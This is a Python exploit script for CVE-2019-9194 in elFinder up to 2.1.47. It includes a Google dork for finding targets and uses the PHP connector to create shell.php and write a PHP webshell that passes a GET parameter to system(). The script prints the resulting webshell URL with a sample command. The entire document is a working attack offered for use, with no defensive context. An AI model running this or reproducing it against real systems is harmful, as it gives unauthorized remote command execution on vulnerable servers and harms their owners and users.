#!/usr/bin/python

#Title: elFinder <=2.1.47 - Webshell creator via PHP connector
#Vendor: https://studio-42.github.io/elFinder/
#Exploit Author: Danxbox44
#Google Dork: intitle:"elFinder 2.1.x"
# CVE: CVE-2019-9194


import sys
import json
import requests

if len(sys.argv) != 2:
    print("Usage: python3 exploit.py <URL>")
    sys.exit(0)

target = sys.argv[1]

response = requests.get(f"{target}php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name=shell.php")

if response.status_code != 200:
    print("Something went wrong aborting...")
    sys.exit(0)

file_hash = json.loads(response.text)["added"][0]["hash"]

res = requests.get(f"""{target}php/connector.minimal.php?cmd=put&content=<?php system($_GET["66347183517170905805845495"]); ?>&target={file_hash}""")

if res.status_code != 200:
    print("Something went wrong aborting...")
    sys.exit(0)

print(f"pwned! Webshell: {target}files/shell.php?66347183517170905805845495=id")





